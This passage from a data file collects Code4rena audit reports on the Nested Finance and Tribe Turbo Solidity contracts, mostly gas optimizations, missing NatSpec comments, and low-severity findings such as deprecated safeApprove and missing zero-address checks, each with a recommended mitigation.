(uint256 i = 0; i < _batchedOrders.length; i++) {\nNestedRecords.sol:71:            uint256 tokenIndex = 0;\nNestedRecords.sol:196:        for (uint256 i = 0; i < tokensCount; i++) {\nOperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) {\nOperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) {\nOperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) {\n``` \n\nI suggest removing explicit initializations for default values.\n\n### Comparisons\n### Amounts should be checked for 0 before calling a transfer\nChecking non-zero transfer values can avoid an expensive external call and save gas.  \n\nPlaces I suggest adding a non-zero-value check:  \n```  \nFeeSplitter.sol:155:                _tokens[i].safeTransfer(_msgSender(), amount);\nFeeSplitter.sol:167:            _tokens[i].safeTransfer(_msgSender(), amount);\nFeeSplitter.sol:182:        _token.safeTransferFrom(_msgSender(), address(this), _amount);\nFeeSplitter.sol:199:        _token.safeTransferFrom(_msgSender(), address(this), _amount);\nNestedFactory.sol:134:        _token.safeTransfer(owner(), amount);\nNestedFactory.sol:467:        _token.safeTransfer(reserveAddr, _amount);\nNestedFactory.sol:503:            _inputToken.safeTransferFrom(_msgSender(), address(this), _inputTokenAmount);\nNestedFactory.sol:558:            _token.safeTransfer(_dest, _amount);\nNestedFactory.sol:574:        _token.safeTransfer(_dest, _amount - feeAmount);\nNestedReserve.sol:23:        _token.safeTransfer(_recipient, _amount);\nNestedReserve.sol:30:        _token.safeTransfer(msg.sender, _amount);\n```  \n\n### For-Loops\n#### `++i` costs less gas compared to `i++`\n`++i` costs less gas compared to `i++` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  \n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nInstances include:  \n```\nabstracts\\MixinOperatorResolver.sol:36:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nabstracts\\MixinOperatorResolver.sol:55:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nFeeSplitter.sol:126:        for (uint256 i = 0; i < accountsLength; i++) {\nFeeSplitter.sol:148:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:165:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:261:        for (uint256 i = 0; i < shareholders.length; i++) {\nFeeSplitter.sol:280:        for (uint256 i = 0; i < shareholdersCache.length; i++) {\nFeeSplitter.sol:318:        for (uint256 i = 0; i < shareholders.length; i++) {\nNestedFactory.sol:103:        for (uint256 i = 0; i < operatorsCache.length; i++) {\nNestedFactory.sol:113:        for (uint256 i = 0; i < operatorsLength; i++) {\nNestedFactory.sol:153:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:213:        for (uint256 i = 0; i < tokensLength; i++) {\nNestedFactory.sol:273:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:291:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:327:        for (uint256 i = 0; i < batchLength; i++) {\nNestedFactory.sol:369:        for (uint256 i = 0; i < _batchedOrders.orders.length; i++) {\nNestedFactory.sol:581:        for (uint256 i = 0; i < _batchedOrders.length; i++) {\nNestedRecords.sol:78:                tokenIndex++;\nNestedRecords.sol:196:        for (uint256 i = 0; i < tokensCount; i++) {\nOperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) {\nOperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) {\nOperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) {\n``` \n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n#### Increments can be unchecked\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:  \n```\nabstracts\\MixinOperatorResolver.sol:36:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nabstracts\\MixinOperatorResolver.sol:55:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nFeeSplitter.sol:126:        for (uint256 i = 0; i < accountsLength; i++) {\nFeeSplitter.sol:148:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:165:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:261:        for (uint256 i = 0; i < shareholders.length; i++) {\nFeeSplitter.sol:280:        for (uint256 i = 0; i < shareholdersCache.length; i++) {\nFeeSplitter.sol:318:        for (uint256 i = 0; i < shareholders.length; i++) {\nNestedFactory.sol:103:        for (uint256 i = 0; i < operatorsCache.length; i++) {\nNestedFactory.sol:113:        for (uint256 i = 0; i < operatorsLength; i++) {\nNestedFactory.sol:153:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:213:        for (uint256 i = 0; i < tokensLength; i++) {\nNestedFactory.sol:273:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:291:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:327:        for (uint256 i = 0; i < batchLength; i++) {\nNestedFactory.sol:369:        for (uint256 i = 0; i < _batchedOrders.orders.length; i++) {\nNestedFactory.sol:581:        for (uint256 i = 0; i < _batchedOrders.length; i++) {\nNestedRecords.sol:78:                tokenIndex++;\nNestedRecords.sol:196:        for (uint256 i = 0; i < tokensCount; i++) {\nOperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) {\nOperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) {\nOperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) {\n``` \n\nThe code would go from:  \n  \n```\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\nto:  \n```\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\nThe risk of overflow is inexistant for a `uint256` here.\n\n#### An array's length should be cached to save gas in for-loops\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n```\nabstracts\\MixinOperatorResolver.sol:36:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nabstracts\\MixinOperatorResolver.sol:55:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nFeeSplitter.sol:148:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:165:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:261:        for (uint256 i = 0; i < shareholders.length; i++) {\nFeeSplitter.sol:280:        for (uint256 i = 0; i < shareholdersCache.length; i++) {\nFeeSplitter.sol:318:        for (uint256 i = 0; i < shareholders.length; i++) {\nNestedFactory.sol:103:        for (uint256 i = 0; i < operatorsCache.length; i++) {\nNestedFactory.sol:369:        for (uint256 i = 0; i < _batchedOrders.orders.length; i++) {\nNestedFactory.sol:581:        for (uint256 i = 0; i < _batchedOrders.length; i++) {\nOperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) {\nOperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) {\n```\n\n### Errors\n\n#### Reduce the size of error messages (Long revert Strings)\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. \n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc. \n\nRevert strings > 32 bytes are here: \n\n```\nabstracts\\OwnableProxyDelegation.sol:56:        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\noperators\\ZeroEx\\ZeroExOperator.sol:36:        require(amountBought != 0, \"ZeroExOperator::performSwap: amountBought cant be zero\");\noperators\\ZeroEx\\ZeroExOperator.sol:37:        require(amountSold != 0, \"ZeroExOperator::performSwap: amountSold cant be zero\");\nNestedFactory.sol:444:            require(amounts[1] <= _amountToSpend, \"NestedFactory::_safeSubmitOrder: Overspent\"); \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next.\n\n#### Use Custom Errors instead of Revert Strings to save Gas\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: https://blog.soliditylang.org/2021/04/21/custom-errors/:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include: \n\n```\nabstracts\\MixinOperatorResolver.sol:76:        require(_foundAddress.implementation != address(0), string(abi.encodePacked(\"MOR: MISSING_OPERATOR: \", name)));\nabstracts\\MixinOperatorResolver.sol:100:            require(tokens[0] == _outputToken, \"OH: INVALID_OUTPUT_TOKEN\");\nabstracts\\MixinOperatorResolver.sol:101:            require(tokens[1] == _inputToken, \"OH: INVALID_OUTPUT_TOKEN\");\nabstracts\\OwnableFactoryHandler.sol:21:        require(supportedFactories[msg.sender], \"OFH: FORBIDDEN\");\nabstracts\\OwnableFactoryHandler.sol:28:        require(_factory != address(0), \"OFH: INVALID_ADDRESS\");\nabstracts\\OwnableFactoryHandler.sol:36:        require(supportedFactories[_factory], \"OFH: NOT_SUPPORTED\");\nabstracts\\OwnableProxyDelegation.sol:25:        require(!initialized, \"OFP: INITIALIZED\");\nabstracts\\OwnableProxyDelegation.sol:26:        require(StorageSlot.getAddressSlot(_ADMIN_SLOT).value == msg.sender, \"OFP: FORBIDDEN\");\nabstracts\\OwnableProxyDelegation.sol:40:        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\nabstracts\\OwnableProxyDelegation.sol:56:        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\noperators\\Flat\\FlatOperator.sol:18:        require(amount != 0, \"FO: INVALID_AMOUNT\");\noperators\\ZeroEx\\ZeroExOperator.sol:32:        require(success, \"ZEO: SWAP_FAILED\");\noperators\\ZeroEx\\ZeroExOperator.sol:36:        require(amountBought != 0, \"ZeroExOperator::performSwap: amountBought cant be zero\");\noperators\\ZeroEx\\ZeroExOperator.sol:37:        require(amountSold != 0, \"ZeroExOperator::performSwap: amountSold cant be zero\");\nFeeSplitter.sol:94:        require(_weth != address(0), \"FS: INVALID_ADDRESS\");\nFeeSplitter.sol:103:        require(msg.sender == weth, \"FS: ETH_SENDER_NOT_WETH\");\nFeeSplitter.sol:111:        require(_weight != 0, \"FS: WEIGHT_ZERO\");\nFeeSplitter.sol:123:        require(accountsLength != 0 && accountsLength == _weights.length, \"FS: INPUTS_LENGTH_MUST_MATCH\");\nFeeSplitter.sol:135:        require(_accountIndex < shareholders.length, \"FS: INVALID_ACCOUNT_INDEX\");\nFeeSplitter.sol:137:        require(totalWeights != 0, \"FS: TOTAL_WEIGHTS_ZERO\");\nFeeSplitter.sol:153:                require(success, \"FS: ETH_TRANFER_ERROR\");\nFeeSplitter.sol:196:        require(_royaltiesTarget != address(0), \"FS: INVALID_ROYALTIES_TARGET\");\nFeeSplitter.sol:306:        require(amountToRelease != 0, \"FS: NO_PAYMENT_DUE\");\nFeeSplitter.sol:316:        require(_weight != 0, \"FS: ZERO_WEIGHT\");\nFeeSplitter.sol:317:        require(_account != address(0), \"FS: INVALID_ADDRESS\");\nFeeSplitter.sol:319:            require(shareholders[i].account != _account, \"FS: ALREADY_SHAREHOLDER\");\nNestedAsset.sol:34:        require(_address == ownerOf(_tokenId), \"NA: FORBIDDEN_NOT_OWNER\");\nNestedAsset.sol:44:        require(_exists(_tokenId), \"URI query for nonexistent token\");\nNestedAsset.sol:78:        require(_exists(_replicatedTokenId) && tokenId != _replicatedTokenId, \"NA: INVALID_REPLICATED_TOKEN_ID\");\nNestedAsset.sol:111:        require(bytes(tokenURI(_tokenId)).length == 0, \"NA: TOKEN_URI_IMMUTABLE\");\nNestedFactory.sol:54:        require(\nNestedFactory.sol:78:        require(nestedAsset.ownerOf(_nftId) == _msgSender(), \"NF: CALLER_NOT_OWNER\");\nNestedFactory.sol:86:        require(block.timestamp > nestedRecords.getLockTimestamp(_nftId), \"NF: LOCKED_NFT\");\nNestedFactory.sol:101:        require(operator != bytes32(\"\"), \"NF: INVALID_OPERATOR_NAME\");\nNestedFactory.sol:104:            require(operatorsCache[i] != operator, \"NF: EXISTENT_OPERATOR\");\nNestedFactory.sol:126:        require(address(_feeSplitter) != address(0), \"NF: INVALID_FEE_SPLITTER_ADDRESS\");\nNestedFactory.sol:148:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\");\nNestedFactory.sol:207:        require(_orders.length != 0, \"NF: INVALID_ORDERS\");\nNestedFactory.sol:208:        require(tokensLength == _orders.length, \"NF: INPUTS_LENGTH_MUST_MATCH\");\nNestedFactory.sol:209:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\");\nNestedFactory.sol:243:        require(assetTokensLength > _tokenIndex, \"NF: INVALID_TOKEN_INDEX\");\nNestedFactory.sol:245:        require(assetTokensLength > 1, \"NF: UNALLOWED_EMPTY_PORTFOLIO\");\nNestedFactory.sol:246:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\");\nNestedFactory.sol:270:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\");\nNestedFactory.sol:271:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\");\nNestedFactory.sol:288:        require(batchedOrdersLength != 0, \"NF: INVALID_MULTI_ORDERS\");\nNestedFactory.sol:289:        require(nestedRecords.getAssetReserve(_nftId) == address(reserve), \"NF: RESERVE_MISMATCH\");\nNestedFactory.sol:317:        require(batchLength != 0, \"NF: INVALID_ORDERS\");\nNestedFactory.sol:337:        require(amountSpent <= _inputTokenAmount - feesAmount, \"NF: OVERSPENT\");\nNestedFactory.sol:363:        require(batchLength != 0, \"NF: INVALID_ORDERS\");\nNestedFactory.sol:364:        require(_batchedOrders.amounts.length == batchLength, \"NF: INPUTS_LENGTH_MUST_MATCH\");\nNestedFactory.sol:385:            require(amountSpent <= _inputTokenAmount, \"NF: OVERSPENT\");\nNestedFactory.sol:418:        require(success, \"NF: OPERATOR_CALL_FAILED\");\nNestedFactory.sol:444:            require(amounts[1] <= _amountToSpend, \"NestedFactory::_safeSubmitOrder: Overspent\");\nNestedFactory.sol:489:            require(address(this).balance >= _inputTokenAmount, \"NF: INVALID_AMOUNT_IN\");\nNestedFactory.sol:496:            require(\nNestedFactory.sol:556:            require(success, \"NF: ETH_TRANSFER_ERROR\");\nNestedFactory.sol:586:        require(msg.value == ethNeeded, \"NF: WRONG_MSG_VALUE\");\nNestedRecords.sol:53:        require(_maxHoldingsCount != 0, \"NRC: INVALID_MAX_HOLDINGS\");\nNestedRecords.sol:92:        require(records[_nftId].holdings[token] != 0, \"NRC: HOLDING_INACTIVE\");\nNestedRecords.sol:119:            require(records[_nftId].reserve == _reserve, \"NRC: RESERVE_MISMATCH\");\nNestedRecords.sol:123:        require(records[_nftId].tokens.length < maxHoldingsCount, \"NRC: TOO_MANY_TOKENS\");\nNestedRecords.sol:124:        require(\nNestedRecords.sol:140:        require(_timestamp > records[_nftId].lockTimestamp, \"NRC: LOCK_PERIOD_CANT_DECREASE\");\nNestedReserve.sol:22:        require(_recipient != address(0), \"NRS: INVALID_ADDRESS\");\nOperatorResolver.sol:27:        require(_foundOperator.implementation != address(0), reason);\nOperatorResolver.sol:39:        require(namesLength == destinations.length, \"OR: INPUTS_LENGTH_MUST_MATCH\");\nOperatorResolver.sol:57:        require(names.length == operatorsToImport.length, \"OR: INPUTS_LENGTH_MUST_MATCH\");\n```\n\nI suggest replacing revert strings with custom errors.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/28"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-02-tribe-turbo\n\n1 Delete unused variable. \n\nIt seems that pool is used only in constructor and this variable will not be called from other contracts. \n\nDelete the following line if it is really used only in constructor\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L35\n\nadd \n\nComptroller pool = master.pool(); into constructor.\n\n2 Delete unused param in function.\n\nThe second uint256 is defined, but not used.\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L138\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L146\n\n3 Delete unused variable.\n\nIt seems that fei is used only in constructor.\n\nIf so, you can delete the following line\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboSavior.sol#L31\n\nand change next line\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboSavior.sol#L54 \n\nto Fei fei = Fei(address(master.fei()));\n\n4 Use safeIncreaseAllowance instead of safeApprove.\n\nOpenzeppelin recommends that \n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L50-L52\n\nI think you can use in this case safeIncreaseAllowance.\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboSafe.sol#L194\n\n5 No description about the cause of revert.\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboSavior.sol#L106\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboGibber.sol#L81\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/modules/TurboGibber.sol#L100\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/75"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n**Table of Contents:**\n\n- [QA Report](#qa-report)\n  - [Foreword](#foreword)\n  - [Summary](#summary)\n  - [File: TurboMaster.sol](#file-turbomastersol)\n    - [event TokenSweeped()](#event-tokensweeped)\n      - [Missing `@param token`](#missing-param-token)\n  - [File: TurboSafe.sol](#file-turbosafesol)\n    - [event TokenSweeped()](#event-tokensweeped-1)\n      - [Missing `@param token`](#missing-param-token-1)\n  - [File: TurboBooster.sol](#file-turboboostersol)\n    - [event BoostCapUpdatedForVault()](#event-boostcapupdatedforvault)\n      - [Missing `@param user`](#missing-param-user)\n    - [event BoostCapUpdatedForCollateral()](#event-boostcapupdatedforcollateral)\n      - [Missing `@param user`](#missing-param-user-1)\n  - [File: TurboClerk.sol](#file-turboclerksol)\n    - [event DefaultFeePercentageUpdated()](#event-defaultfeepercentageupdated)\n      - [Missing `@param user`](#missing-param-user-2)\n    - [event CustomFeePercentageUpdatedForCollateral()](#event-customfeepercentageupdatedforcollateral)\n      - [Missing `@param user`](#missing-param-user-3)\n    - [event CustomFeePercentageUpdatedForSafe()](#event-customfeepercentageupdatedforsafe)\n      - [Missing `@param user`](#missing-param-user-4)\n  - [File: TurboSavior.sol](#file-turbosaviorsol)\n    - [event MinDebtPercentageForSavingUpdated()](#event-mindebtpercentageforsavingupdated)\n      - [Missing `@param user`](#missing-param-user-5)\n\n## Foreword\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Summary\n\n- It feels like the code was already audited, well done!\n- This report only contains some minor missing comments (`@param user`and `@param token`)\n\n## File: TurboMaster.sol\n\n### event TokenSweeped()\n\n#### Missing `@param token`\n\n```\n308:     /// @notice Emitted a token is sweeped from the Master.\n309:     /// @param user The user who sweeped the token from the Master.\n310:     /// @param to The recipient of the sweeped tokens. //@audit missing @param token \n311:     /// @param amount The amount of the token that was sweeped.\n312:     event TokenSweeped(address indexed user, address indexed to, ERC20 indexed token, uint256 amount);\n```\n\n## File: TurboSafe.sol\n\n### event TokenSweeped()\n\n#### Missing `@param token`\n\n```\n296:     /// @notice Emitted a token is sweeped from the Safe.\n297:     /// @param user The user who sweeped the token from the Safe.\n298:     /// @param to The recipient of the sweeped tokens. //@audit missing @param token\n299:     /// @param amount The amount of the token that was sweeped.\n300:     event TokenSweeped(address indexed user, address indexed to, ERC20 indexed token, uint256 amount);\n```\n\n## File: TurboBooster.sol\n\n### event BoostCapUpdatedForVault()\n\n#### Missing `@param user`\n\n```\n51:     /// @notice Emitted when a Vault's boost cap is updated.\n52:     /// @param vault The Vault who's boost cap was updated.\n53:     /// @param newBoostCap The new boost cap for the Vault.  //@audit missing @param user\n54:     event BoostCapUpdatedForVault(address indexed user, ERC4626 indexed vault, uint256 newBoostCap);\n```\n\nThere don't seem to be a sensible reason to not mention `@param user`. It was previously mentioned, and a similar `event` does in fact mention it too:\n\n```\nFile: TurboSavior.sol\n89:     /// @notice Emitted a save is executed.\n90:     /// @param user The user who executed the save. //@audit-ok user\n91:     /// @param safe The Safe that was saved.\n92:     /// @param vault The Vault that was lessed.\n93:     /// @param feiAmount The amount of Fei that was lessed.\n94:     event SafeSaved(address indexed user, TurboSafe indexed safe, ERC4626 indexed vault, uint256 feiAmount);\n```\n\nThe missing comment should therefore be added\n\n### event BoostCapUpdatedForCollateral()\n\n#### Missing `@param user`\n\n```\n73:     /// @notice Emitted when a collateral type's boost cap is updated.\n74:     /// @param collateral The collateral type who's boost cap was updated.//@audit missing @param user\n75:     /// @param newBoostCap The new boost cap for the collateral type.\n76:     event BoostCapUpdatedForCollateral(address indexed user, ERC20 indexed collateral, uint256 newBoostCap);\n```\n\n## File: TurboClerk.sol\n\n### event DefaultFeePercentageUpdated()\n\n#### Missing `@param user`\n\n```\n30:     /// @notice Emitted when the default fee percentage is updated.\n31:     /// @param newDefaultFeePercentage The new default fee percentage. //@audit missing @param user\n32:     event DefaultFeePercentageUpdated(address indexed user, uint256 newDefaultFeePercentage);\n```\n\n### event CustomFeePercentageUpdatedForCollateral()\n\n#### Missing `@param user`\n\n```\n58:     /// @notice Emitted when a collateral's custom fee percentage is updated.\n59:     /// @param collateral The collateral who's custom fee percentage was updated. //@audit missing @param user\n60:     /// @param newFeePercentage The new custom fee percentage.\n61:     event CustomFeePercentageUpdatedForCollateral(\n62:         address indexed user,\n63:         ERC20 indexed collateral,\n64:         uint256 newFeePercentage\n65:     );\n```\n\n### event CustomFeePercentageUpdatedForSafe()\n\n#### Missing `@param user`\n\n```\n80:     /// @notice Emitted when a Safe's custom fee percentage is updated.\n81:     /// @param safe The Safe who's custom fee percentage was updated.//@audit missing @param user\n82:     /// @param newFeePercentage The new custom fee percentage.\n83:     event CustomFeePercentageUpdatedForSafe(address indexed user, TurboSafe indexed safe, uint256 newFeePercentage);\n```\n\n## File: TurboSavior.sol\n\n### event MinDebtPercentageForSavingUpdated()\n\n#### Missing `@param user`\n\n```\nFile: TurboSavior.sol\n69:     /// @notice Emitted when the minimum debt percentage for saving is updated.\n70:     /// @param newDefaultFeePercentage The new minimum debt percentage for saving. //@audit missing @param user\n71:     event MinDebtPercentageForSavingUpdated(address indexed user, uint256 newDefaultFeePercentage);\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/65"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Deprecated safeApprove() function\n\n## Impact -  LOW\n\nDetailed description of the impact of this finding.\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L89\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/modules/TurboGibber.sol#L55\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nAs suggested by the OpenZeppelin comment, replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead.\n\n\n# C4-002 : The Contract Should Approve(0) first\n\n## Impact -  LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L89\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/modules/TurboGibber.sol#L55\n\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n# C4-003 : Lack Of Return Value Check On the Oracle\n\n## Impact -  LOW\n\nDuring the code review, It has been seen that oracle return value has not been checked on the function.  If oracle is returned price as a 0, borrowLimit will be zero.\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/modules/TurboSavior.sol#L121\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/modules/TurboSavior.sol#L125\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to add return value check on the oracle function.\n\n\n# C4-004 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L52\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/modules/TurboGibber.sol#L45\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboMaster.sol#L47\n\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboMaster.sol#L46\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nThe protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L342\n```\n\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.",
    "dataSource": {
      "name": "code-423n4/2022-02-tribe-turbo-findings",
      "repo": "https://github.com/code-423n4/2022-02-tribe-turbo-findings",
      "url": "https://github.com/code-423n4/2022-02-tribe-turbo-findings/issues/58"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [G] Cache external call result in storage can save gas\n\nFor the unchanged results of an external call that will be reused multiple times, cache and read from storage rather than initiate a fresh external call can save gas.\n\nIn `TurboSavior.sol#save()`, `pool.oracle()` is called twice at L121 and L125.\n\nhttps://github.com/fei-protocol/tribe-turbo/blob/5e1c5d9b49dc557c84f07afabbba2ba4e08e9cc6/src/modules/TurboSavior.sol#L116-L126\n\n```solidity\n// Compute the value of the Safe's collateral. Rounded down to favor saving.\nuint256 borrowLimit = assetTurboCToken\n    .balanceOf(address(safe))\n    .mulWadDown(assetTurboCToken.exchangeRateStored())\n    .mulWadDown(collateralFactor)\n    .mulWadDown(pool.oracle().getUnderlyingPrice(assetTurboCToken));\n\n// Compute the value of the Safe's debt. Rounding up to favor saving them.\nuint256 debtValue = feiTurboCToken.borrowBalanceCurrent(address(safe)).mulWadUp(\n    pool.oracle().getUnderlyingPrice(feiTurboCToken)\n);\n```\n\n## [M] Unused function parameters\n\nUnused function parameters increase contract size and gas usage at 